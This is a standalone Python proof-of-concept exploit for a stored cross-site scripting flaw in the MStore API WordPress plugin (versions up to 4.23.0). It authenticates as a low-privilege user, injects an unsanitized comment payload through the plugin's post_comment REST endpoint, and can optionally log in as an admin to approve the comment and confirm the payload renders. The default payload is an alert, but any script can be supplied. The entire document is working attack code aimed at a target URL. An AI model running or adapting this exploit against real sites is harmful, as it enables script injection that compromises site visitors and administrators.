#!/usr/bin/env python3
"""
Authenticated (Subscriber+) Stored XSS
============================================================

Exploits /wp-json/api/flutter_user/post_comment, which passes the
user-controlled "content" parameter directly to wp_insert_comment()
without sanitization or a capability check.

The comment is created as pending (comment_approved = 0). An admin must
approve it (or the site must auto-approve pending comments) before the
payload is rendered on the frontend.

Usage (attacker, interactive credentials):
    python3 poc.py --url="http://target/?p=1"

Usage (attacker, non-interactive):
    python3 poc.py --url="http://target/?p=1" \
                   --username="attacker" --password="attackerpass"

Usage (full local lab, auto-approve + verify):
    python3 poc.py --url="http://target/?p=1" \
                   --username="attacker" --password="attackerpass" \
                   --admin-user="admin" --admin-pass="adminpass" --check

The script uses only the Python standard library.
"""

from __future__ import annotations

import argparse
import getpass
import html
import json
import re
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar

DEFAULT_PAYLOAD = '<img src=x onerror="alert(1)" data-mstore-poc="1">'
DEFAULT_MARKER = "data-mstore-poc"
USER_AGENT = "MStore-API-Stored-XSS-PoC/1.0"


class PoCError(RuntimeError):
    pass


def log(message: str) -> None:
    print(message, flush=True)


def http_request(
    url: str,
    *,
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    opener: urllib.request.OpenerDirector | None = None,
    timeout: float = 20.0,
    insecure: bool = False,
) -> tuple[int, str, str]:
    """Return (status, body, final_url)."""
    request_headers = {"User-Agent": USER_AGENT}
    if headers:
        request_headers.update(headers)

    req = urllib.request.Request(url, data=data, headers=request_headers)
    if opener is None:
        context = ssl._create_unverified_context() if insecure else None
        opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=context) if context else urllib.request.HTTPSHandler()
        )

    try:
        with opener.open(req, timeout=timeout) as response:
            body = response.read().decode("utf-8", "replace")
            return response.status, body, response.geturl()
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace")
        return exc.code, body, exc.geturl()
    except urllib.error.URLError as exc:
        raise PoCError(f"Request failed for {url}: {exc.reason}") from exc


def json_request(
    url: str,
    payload: dict,
    *,
    opener: urllib.request.OpenerDirector | None = None,
    timeout: float = 20.0,
    insecure: bool = False,
) -> tuple[int, dict | list | None, str]:
    status, body, final_url = http_request(
        url,
        data=json.dumps(payload).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        opener=opener,
        timeout=timeout,
        insecure=insecure,
    )
    try:
        parsed = json.loads(body)
    except json.JSONDecodeError:
        parsed = None
    return status, parsed, body


def extract_rest_root(page_html: str, page_url: str) -> str | None:
    """Find the WordPress REST root from the api.w.org link tag."""
    match = re.search(r"<link[^>]+rel=[\"']https://api\.w\.org/[\"'][^>]*>", page_html, re.I)
    if match:
        href = re.search(r"href=[\"']([^\"']+)[\"']", match.group(0), re.I)
        if href:
            return urllib.parse.urljoin(page_url, html.unescape(href.group(1)))

    # Fallback: common locations.
    parsed = urllib.parse.urlparse(page_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    path_parts = [p for p in parsed.path.split("/") if p]
    candidates = [origin + "/wp-json/"]
    for index in range(len(path_parts), 0, -1):
        candidates.append(origin + "/" + "/".join(path_parts[:index]) + "/wp-json/")

    for candidate in dict.fromkeys(candidates):
        try:
            status, body, _ = http_request(candidate, timeout=10, insecure=True)
        except PoCError:
            continue
        if status == 200 and '"routes"' in body:
            return candidate
    return None


def extract_post_id(page_html: str, page_url: str, rest_root: str, timeout: float, insecure: bool) -> int | None:
    """Resolve the post/page ID from the URL, HTML, or REST API."""
    parsed = urllib.parse.urlparse(page_url)
    query = urllib.parse.parse_qs(parsed.query)
    for key in ("p", "page_id", "post_id", "attachment_id"):
        if key in query and query[key]:
            try:
                return int(query[key][0])
            except (TypeError, ValueError):
                pass

    for pattern in (
        r"postid-(\d+)",
        r"page-id-(\d+)",
        r"id=[\"']post-(\d+)[\"']",
        r"<article[^>]+id=[\"']post-(\d+)[\"']",
    ):
        match = re.search(pattern, page_html, re.I)
        if match:
            return int(match.group(1))

    # Pretty permalinks: ask the REST API for the slug.
    slug = ""
    path_parts = [p for p in parsed.path.split("/") if p]
    if path_parts:
        slug = path_parts[-1]
        if slug.endswith(".html"):
            slug = slug[:-5]

    if slug:
        for endpoint in ("wp/v2/posts", "wp/v2/pages"):
            url = f"{rest_root}{endpoint}?slug={urllib.parse.quote(slug)}&_fields=id,link"
            try:
                status, body, _ = http_request(url, timeout=timeout, insecure=insecure)
            except PoCError:
                continue
            if status != 200:
                continue
            try:
                items = json.loads(body)
            except json.JSONDecodeError:
                continue
            if isinstance(items, list) and items and isinstance(items[0], dict) and "id" in items[0]:
                return int(items[0]["id"])
    return None


def get_attacker_cookie(
    rest_root: str,
    username: str | None,
    password: str | None,
    cookie: str | None,
    timeout: float,
    insecure: bool,
) -> str:
    if cookie:
        return cookie

    if not username or not password:
        raise PoCError("Provide --cookie, or provide --username and --password.")

    login_url = urllib.parse.urljoin(rest_root, "api/flutter_user/generate_auth_cookie")
    status, parsed, body = json_request(
        login_url,
        {"username": username, "password": password},
        timeout=timeout,
        insecure=insecure,
    )
    if status != 200 or not isinstance(parsed, dict) or "cookie" not in parsed:
        raise PoCError(f"Login failed (HTTP {status}): {body[:500]}")
    return str(parsed["cookie"])


def inject_comment(
    rest_root: str,
    cookie: str,
    post_id: int,
    content: str,
    meta: str,
    timeout: float,
    insecure: bool,
) -> int:
    endpoint = urllib.parse.urljoin(rest_root, "api/flutter_user/post_comment")
    query = urllib.parse.urlencode(
        {
            "cookie": cookie,
            "post_id": str(post_id),
            "content": content,
            "meta": meta,
        }
    )
    status, body, _ = http_request(f"{endpoint}?{query}", timeout=timeout, insecure=insecure)
    if status != 200:
        raise PoCError(f"Comment injection failed (HTTP {status}): {body[:500]}")
    try:
        parsed = json.loads(body)
    except json.JSONDecodeError as exc:
        raise PoCError(f"Unexpected response: {body[:500]}") from exc
    if not isinstance(parsed, dict) or "comment_id" not in parsed:
        raise PoCError(f"Comment was not created: {body[:500]}")
    return int(parsed["comment_id"])


def build_session(insecure: bool) -> urllib.request.OpenerDirector:
    jar = CookieJar()
    handlers: list[urllib.request.BaseHandler] = [
        urllib.request.HTTPCookieProcessor(jar),
    ]
    if insecure:
        handlers.append(urllib.request.HTTPSHandler(context=ssl._create_unverified_context()))
    return urllib.request.build_opener(*handlers)


def admin_login(site_url: str, username: str, password: str, timeout: float, insecure: bool) -> urllib.request.OpenerDirector:
    opener = build_session(insecure)
    login_url = urllib.parse.urljoin(site_url, "wp-login.php")

    # Prime the test cookie.
    http_request(login_url, opener=opener, timeout=timeout, insecure=insecure)

    form = urllib.parse.urlencode(
        {
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": urllib.parse.urljoin(site_url, "wp-admin/"),
            "testcookie": "1",
        }
    ).encode("utf-8")
    status, body, final_url = http_request(
        login_url,
        data=form,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        opener=opener,
        timeout=timeout,
        insecure=insecure,
    )
    if status != 200 or "wp-login.php" in urllib.parse.urlparse(final_url).path:
        error = re.search(r'<div[^>]+id=["\']login_error["\'][^>]*>(.*?)</div>', body, re.I | re.S)
        detail = re.sub(r"<[^>]+>", " ", error.group(1)).strip() if error else body[:300]
        raise PoCError(f"Admin login failed: {detail}")
    return opener


def approve_comment(
    site_url: str,
    comment_id: int,
    admin_user: str,
    admin_pass: str,
    timeout: float,
    insecure: bool,
) -> None:
    opener = admin_login(site_url, admin_user, admin_pass, timeout, insecure)
    comments_url = urllib.parse.urljoin(site_url, "wp-admin/edit-comments.php?comment_status=moderated")
    status, body, final_url = http_request(comments_url, opener=opener, timeout=timeout, insecure=insecure)
    if status != 200:
        raise PoCError(f"Could not open the moderation queue (HTTP {status}).")

    links = re.findall(r'href=["\']([^"\']*action=approvecomment[^"\']*)["\']', body, re.I)
    target = None
    comment_pattern = re.compile(rf"(?:[?&])c={comment_id}(?:&|$)")
    for link in links:
        link = html.unescape(link)
        if comment_pattern.search(link):
            target = link
            break
    if not target:
        raise PoCError(
            f"Approve link for comment {comment_id} not found. "
            "It may already be approved or the moderation page layout changed."
        )

    approve_url = urllib.parse.urljoin(comments_url, target)
    status, body, final_url = http_request(approve_url, opener=opener, timeout=timeout, insecure=insecure)
    if status != 200:
        raise PoCError(f"Approval request failed (HTTP {status}).")
    log(f"[+] Comment {comment_id} approved.")


def main() -> int:
    parser = argparse.ArgumentParser(
        description="MStore API <= 4.23.0 Subscriber+ Stored XSS PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 poc.py --url='http://target/?p=1'\n"
            "  python3 poc.py --url='http://target/?p=1' --username=attacker --password=pass\n"
            "  python3 poc.py --url='http://target/?p=1' --username=attacker --password=pass "
            "--admin-user=admin --admin-pass=pass --check\n"
        ),
    )
    parser.add_argument("--url", required=True, help="Target post/page URL.")
    parser.add_argument("--post-id", type=int, help="Override the auto-detected post ID.")
    parser.add_argument("--rest-root", help="Override the REST root, e.g. http://target/wp-json/.")
    parser.add_argument("--username", help="Attacker WordPress username (Subscriber+).")
    parser.add_argument("--password", help="Attacker WordPress password.")
    parser.add_argument("--cookie", help="Existing attacker auth cookie (skips login).")
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD, help="Comment payload (default: <img src=x onerror=\"alert(1)\"> with a marker).")
    parser.add_argument("--meta", default='{"rating":5}', help="Value for the comment meta JSON (default: {\"rating\":5}).")
    parser.add_argument("--marker", default=DEFAULT_MARKER, help="String used by --check to detect the payload.")
    parser.add_argument("--admin-user", help="Admin username for automatic approval (lab/testing only).")
    parser.add_argument("--admin-pass", help="Admin password for automatic approval (lab/testing only).")
    parser.add_argument("--check", action="store_true", help="Fetch the post after approval and check for the marker.")
    parser.add_argument("--timeout", type=float, default=20.0, help="HTTP timeout in seconds (default: 20).")
    parser.add_argument("--insecure", action="store_true", help="Do not verify TLS certificates.")
    args = parser.parse_args()

    try:
        if not args.cookie and (not args.username or not args.password):
            try:
                if not args.username:
                    args.username = input("Attacker username: ").strip()
                if not args.password:
                    args.password = getpass.getpass("Attacker password: ")
            except EOFError as exc:
                raise PoCError(
                    "No credentials supplied and no interactive terminal is available; "
                    "use --username/--password or --cookie."
                ) from exc

        log(f"[*] Target URL: {args.url}")
        status, page_html, final_url = http_request(
            args.url, timeout=args.timeout, insecure=args.insecure
        )
        if status != 200:
            raise PoCError(f"Could not load the target URL (HTTP {status}).")
        log(f"[*] Final URL: {final_url}")

        rest_root = args.rest_root or extract_rest_root(page_html, final_url)
        if not rest_root:
            raise PoCError("Could not discover the WordPress REST root. Use --rest-root.")
        rest_root = rest_root.rstrip("/") + "/"
        log(f"[*] REST root: {rest_root}")

        post_id = args.post_id or extract_post_id(
            page_html, final_url, rest_root, args.timeout, args.insecure
        )
        if not post_id:
            raise PoCError("Could not determine the post ID. Use --post-id.")
        log(f"[*] Post ID: {post_id}")

        cookie = get_attacker_cookie(
            rest_root, args.username, args.password, args.cookie, args.timeout, args.insecure
        )
        log("[+] Attacker authentication cookie obtained.")

        comment_id = inject_comment(
            rest_root, cookie, post_id, args.payload, args.meta, args.timeout, args.insecure
        )
        log(f"[+] Comment created: {comment_id}")
        log("[*] The plugin stores it with comment_approved = 0 (pending).")

        site_url = rest_root[: -len("wp-json/")]
        approve_url = urllib.parse.urljoin(site_url, "wp-admin/edit-comments.php?comment_status=moderated")
        log(f"[*] Admin approval URL: {approve_url}")

        approved = False
        if args.admin_user and args.admin_pass:
            log(f"[*] Logging in as admin '{args.admin_user}'...")
            approve_comment(
                site_url,
                comment_id,
                args.admin_user,
                args.admin_pass,
                args.timeout,
                args.insecure,
            )
            approved = True
        else:
            log("[*] Next: log in as an admin, open Comments -> Pending, and approve the comment.")
            log("[*] After approval, any visitor to the post executes the payload.")

        if args.check:
            if not approved:
                log("[!] --check without admin approval: the comment is likely still pending.")
            status, rendered, _ = http_request(
                args.url, timeout=args.timeout, insecure=args.insecure
            )
            if args.marker and args.marker in rendered:
                log(f"[+] Marker '{args.marker}' found in the rendered post HTML.")
                log("[+] Stored XSS is confirmed. Visit the post in a browser to execute it.")
            else:
                log(f"[-] Marker '{args.marker}' not found. The comment may still be pending or sanitized.")
        return 0
    except PoCError as exc:
        log(f"[!] {exc}")
        return 1
    except KeyboardInterrupt:
        log("\n[!] Interrupted.")
        return 130


if __name__ == "__main__":
    sys.exit(main())
